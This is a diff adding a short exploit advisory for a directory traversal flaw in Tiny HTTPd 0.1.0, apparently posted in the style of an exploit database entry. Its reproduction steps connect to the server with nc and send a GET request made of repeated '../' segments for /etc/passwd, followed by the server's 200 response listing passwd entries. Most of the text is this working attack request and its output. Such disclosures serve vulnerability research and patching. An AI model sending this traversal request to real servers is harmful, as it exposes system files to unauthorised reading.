@@ -1,0 +1,33 @@
+#======================================================================================
+# Exploit Author: Touhid M.Shaikh
+# Exploit Title: Tiny HTTPd 0.1.0 Local File Traversal
+# Date: 26-09-2017
+# Website: www.touhidshaikh.com
+# Vulnerable Software:  Tiny HTTPd
+# Version: 0.1.0
+# Download Link:
+https://sourceforge.net/projects/tinyhttpd/?source=directory
+#======================================================================================
+
+
+
+# To reproduce the exploit:
+#   1. run the #./httpd
+#   2. #nc localhost 44123
+# GET /../../../../../../../../../../../etc/passwd HTTP/1.1
+
+
+#==========
+#Responce
+#==========
+
+
+HTTP/1.0 200 OK
+Server: jdbhttpd/0.1.0
+Content-Type: text/html
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+---------------------snip---------------------------
